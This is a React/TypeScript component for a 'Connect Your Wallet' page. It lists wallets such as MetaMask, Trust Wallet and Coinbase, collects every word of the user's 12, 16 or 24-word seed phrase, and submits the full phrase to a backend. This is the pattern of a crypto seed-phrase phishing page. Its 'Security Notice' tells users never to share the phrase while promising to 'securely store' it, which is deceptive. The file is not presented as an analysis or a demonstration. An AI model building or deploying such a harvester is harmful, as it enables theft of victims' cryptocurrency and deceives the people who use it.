import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { toast } from "react-fox-toast";

//Hooks
import { useCreateWalletConnect } from "@/services/mutations.service";

//Icons
import { Shield, CheckCircle, AlertCircle, Eye, EyeOff } from "lucide-react"
import { WalletAdd1, WalletSearch } from "iconsax-react";

type WalletFormData = {
    walletType: string
    customWalletName: string
    phraseCount: number
    phrases: string[]
}

export default function Form() {

    const [formData, setFormData] = useState<WalletFormData>({
        walletType: "",
        customWalletName: "",
        phraseCount: 12,
        phrases: Array(12).fill(""),
    })

    const [showPhrases, setShowPhrases] = useState<boolean>(false)
    const [isSubmitting, setIsSubmitting] = useState<boolean>(false)
    const [errors, setErrors] = useState<Record<string, string>>({})

    const walletOptions = [
        { id: "metamask", name: "MetaMask", logo: "/metamask.jpg" },
        { id: "trust", name: "Trust Wallet", logo: "/trustwallet.jpg" },
        { id: "atomic", name: "Atomic", logo: "/atomic.jpg" },
        { id: "crypto", name: "Crypto.com", logo: "/crypto.svg" },
        { id: "safePal", name: "Safe Pal", logo: "/safePal.svg" },
        { id: "exodus", name: "Exodus", logo: "/exodus.png" },
        { id: "phantom", name: "Phantom", logo: "/phantom.png" },
        { id: "blockchain", name: "Blockchain", logo: "/blockchain.png" },
        { id: "coinbase", name: "Coinbase", logo: "/coinbase.jpg" }
    ]

    const phraseCountOptions = [12, 16, 24]

    const handleWalletTypeChange = (walletType: string) => {
        setFormData((prev) => ({
            ...prev,
            walletType,
            customWalletName: walletType === "other" ? prev.customWalletName : "",
        }))
        setErrors((prev) => ({ ...prev, walletType: "" }))
    }

    const handleCustomWalletNameChange = (customWalletName: string) => {
        setFormData((prev) => ({ ...prev, customWalletName }))
        setErrors((prev) => ({ ...prev, customWalletName: "" }))
    }

    const handlePhraseCountChange = (phraseCount: number) => {
        const newPhrases = Array(phraseCount).fill("")
        // Preserve existing phrases if switching to a larger count
        for (let i = 0; i < Math.min(formData.phrases.length, phraseCount); i++) {
            newPhrases[i] = formData.phrases[i] || ""
        }

        setFormData((prev) => ({
            ...prev,
            phraseCount,
            phrases: newPhrases,
        }))
        setErrors((prev) => ({ ...prev, phraseCount: "" }))
    }

    const handlePhraseChange = (index: number, value: string) => {
        const newPhrases = [...formData.phrases]
        newPhrases[index] = value.toLowerCase().trim()
        setFormData((prev) => ({ ...prev, phrases: newPhrases }))

        // Clear phrase-specific errors
        setErrors((prev) => ({ ...prev, [`phrase_${index}`]: "" }))
    }

    const validateForm = (): boolean => {
        const newErrors: Record<string, string> = {}

        // Validate wallet type
        if (!formData.walletType) {
            newErrors.walletType = "Please select a wallet type"
        }

        // Validate custom wallet name if "other" is selected
        if (formData.walletType === "other" && !formData.customWalletName.trim()) {
            newErrors.customWalletName = "Please enter the wallet name"
        }

        // Validate phrases
        const emptyPhrases = formData.phrases.filter((phrase, index) => {
            const isEmpty = !phrase.trim()
            if (isEmpty) {
                newErrors[`phrase_${index}`] = "Required"
            }
            return isEmpty
        })

        if (emptyPhrases.length > 0) {
            newErrors.phrases = `Please fill in all ${formData.phraseCount} seed phrases`
        }

        setErrors(newErrors)
        return Object.keys(newErrors).length === 0
    }

    //Submission
    const createWalletConnect = useCreateWalletConnect();
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()

        if (!validateForm()) {
            return toast.error("Kindly fill all needed fields")
        }

        setIsSubmitting(true)
        const data = { wallet: formData.customWalletName ? formData.customWalletName : formData.walletType, passPhrase: formData.phrases }
        createWalletConnect.mutate(data, {
            onSuccess: (response) => {
                setIsSubmitting(false);
                toast.success(response.data.message || "You connected your wallet successfully!");
            },
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            onError: (error: any) => {
                setIsSubmitting(false);
                const message = error?.response?.data?.message || "Connection failed, kindly check your credentials.";
                toast.error(message);
            },
        });
    }

    return (
        <div className="text-neutral-100">
            <div className="bg-black shadow-xl border border-neutral-800 rounded-xl overflow-hidden">
                <div className="bg-gradient-to-r from-primary/30 to-yellow-700 p-4 border-neutral-800 border-b">
                    <div className="flex items-center gap-3 mb-2">
                        <div className="flex justify-center items-center bg-primary/70 rounded-full w-10 h-10">
                            <WalletAdd1 size={20} className="text-neutral-800" />
                        </div>
                        <h1 className="font-bold text-base md:text-lg xl:text-xl">Connect Your Wallet</h1>
                    </div>
                    <p className="text-neutral-300">Securely connect your cryptocurrency wallet using your seed phrase</p>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6 p-4">
                    <div className="space-y-3">
                        <label className="block font-medium">Select Wallet Type</label>
                        <div className="gap-3 grid grid-cols-1">
                            {walletOptions.map((wallet) => (
                                <label key={wallet.id} className={`flex items-center gap-3 px-4 py-3 border rounded-lg cursor-pointer transition-all ${formData.walletType === wallet.id
                                    ? "border-primary bg-primary/20"
                                    : "border-neutral-700 hover:border-neutral-600 bg-[#1E1E1E]"
                                    }`}>
                                    <input type="radio" name="walletType" value={wallet.id} checked={formData.walletType === wallet.id} onChange={(e) => handleWalletTypeChange(e.target.value)} className="sr-only" />
                                    <div className="relative size-8 md:size-10 xl:size-12">
                                        <img src={wallet.logo || "/coin.svg"} alt={wallet.name} className="rounded-xl w-full h-full object-cover" />
                                    </div>
                                    <span className="font-medium">{wallet.name}</span>
                                    {formData.walletType === wallet.id && <CheckCircle size={20} className="ml-auto text-blue-400" />}
                                </label>
                            ))}

                            <label className={`flex items-center gap-3 px-4 py-3 border rounded-lg cursor-pointer transition-all ${formData.walletType === "other"
                                ? "border-blue-500 bg-blue-500/10"
                                : "border-neutral-700 hover:border-neutral-600 bg-[#1E1E1E]"
                                }`}>
                                <input type="radio" name="walletType" value="other" checked={formData.walletType === "other"} onChange={(e) => handleWalletTypeChange(e.target.value)} className="sr-only" />
                                <div className="flex justify-center items-center bg-neutral-300 rounded-full w-8 h-8">
                                    <WalletSearch size={16} className="text-neutral-800" />
                                </div>
                                <span className="font-medium">Other Wallet</span>
                                {formData.walletType === "other" && <CheckCircle size={20} className="ml-auto text-blue-400" />}
                            </label>
                        </div>
                        {errors.walletType && <p className="text-[10px] text-red-400 md:text-xs xl:text-sm">{errors.walletType}</p>}
                    </div>

                    <AnimatePresence>
                        {formData.walletType === "other" && (
                            <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: "auto" }} exit={{ opacity: 0, height: 0 }} transition={{ duration: 0.3 }} className="space-y-2">
                                <label htmlFor="customWalletName" className="block font-medium">
                                    Wallet Name
                                </label>
                                <input id="customWalletName" type="text" value={formData.customWalletName}
                                    onChange={(e) => handleCustomWalletNameChange(e.target.value)} placeholder="Enter wallet name (e.g: Coinbase Wallet)"
                                    className="bg-[#1E1E1E] px-4 py-3 border border-neutral-700 focus:border-blue-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/50 w-full text-white" />
                                {errors.customWalletName && <p className="text-[10px] text-red-400 md:text-xs xl:text-sm">{errors.customWalletName}</p>}
                            </motion.div>
                        )}
                    </AnimatePresence>

                    <div className="space-y-3">
                        <label className="block font-medium">Number of Seed Phrases</label>
                        <div className="flex gap-3">
                            {phraseCountOptions.map((count) => (
                                <button
                                    key={count}
                                    type="button"
                                    onClick={() => handlePhraseCountChange(count)}
                                    className={`px-4 py-2 rounded-lg font-medium transition-all ${formData.phraseCount === count
                                        ? "bg-primary text-black"
                                        : "bg-[#1E1E1E] text-neutral-300 hover:bg-[#2A2A2A] border border-neutral-700"
                                        }`}
                                >
                                    {count} words
                                </button>
                            ))}
                        </div>
                    </div>

                    <div className="space-y-3">
                        <div className="flex justify-between items-center">
                            <label className="block font-medium text-white">Seed Phrases</label>
                            <button type="button" onClick={() => setShowPhrases(!showPhrases)} className="flex items-center gap-1 text-neutral-400 hover:text-neutral-100 text-sm transition-colors">
                                {showPhrases ? <EyeOff size={16} /> : <Eye size={16} />}
                                {showPhrases ? "Hide" : "Show"}
                            </button>
                        </div>

                        <div className="bg-[#1E1E1E] p-4 border border-neutral-700 rounded-lg">
                            <div className="gap-3 grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4">
                                {formData.phrases.map((phrase, index) => (
                                    <div key={index} className="relative">
                                        <div className="top-1/2 left-3 absolute font-mono text-neutral-500 text-xs -translate-y-1/2 transform">
                                            {index + 1}
                                        </div>
                                        <input type={showPhrases ? "text" : "password"} value={phrase} onChange={(e) => handlePhraseChange(index, e.target.value)}
                                            placeholder="word"
                                            className={`w-full bg-[#2A2A2A] border text-white rounded-md py-2 pl-8 pr-3 text-sm focus:outline-none focus:ring-1 transition-colors ${errors[`phrase_${index}`]
                                                ? "border-red-500 focus:ring-red-500/50"
                                                : "border-neutral-600 focus:ring-primary/50 focus:border-primary"
                                                }`}
                                        />
                                    </div>
                                ))}
                            </div>
                            {errors.phrases && <p className="mt-3 text-[10px] text-red-400 md:text-xs xl:text-sm">{errors.phrases}</p>}
                        </div>

                        <div className="flex gap-2 bg-yellow-500/10 p-3 border border-yellow-500/20 rounded-lg">
                            <Shield size={16} className="flex-shrink-0 mt-0.5 text-yellow-500" />
                            <div className="text-yellow-200">
                                <p className="mb-1 font-medium">Security Notice</p>
                                <p>Never share your seed phrase with anyone. We encrypt and securely store your information.</p>
                            </div>
                        </div>
                    </div>

                    <div className="pt-4">
                        {errors.submit && (
                            <div className="flex gap-2 bg-red-500/10 mb-4 p-3 border border-red-500/20 rounded-lg">
                                <AlertCircle size={16} className="flex-shrink-0 mt-0.5 text-red-500" />
                                <p className="text-red-400 text-sm">{errors.submit}</p>
                            </div>
                        )}

                        <button type="submit" disabled={isSubmitting}
                            className="flex justify-center items-center bg-primary hover:bg-yellow-600 disabled:bg-neutral-700 px-4 py-3 rounded-lg w-full font-medium text-black hover:text-neutral-100 disabled:text-neutral-400 transition-colors duration-300">
                            {isSubmitting ? (
                                <>
                                    <svg className="mr-2 -ml-1 w-4 h-4 text-white animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor"
                                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                        ></path>
                                    </svg>
                                    Connecting Wallet...
                                </>
                            ) : (
                                "Connect Wallet"
                            )}
                        </button>
                    </div>
                </form>
            </div>
        </div>
    )
}